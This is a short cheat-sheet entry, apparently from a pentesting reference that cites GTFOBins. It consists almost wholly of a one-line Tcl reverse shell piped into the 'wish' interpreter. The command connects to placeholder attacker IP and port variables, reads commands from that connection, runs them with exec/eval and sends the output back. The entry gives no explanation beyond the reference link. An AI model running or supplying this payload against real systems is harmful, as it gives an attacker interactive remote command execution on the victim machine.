# Wish

```
$ echo 'set s [socket $::env(<attacker_IP>) $::env(<attacker_PORT>)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
```

---
## References

- [GTFOBins: Wish](https://gtfobins.github.io/gtfobins/wish/)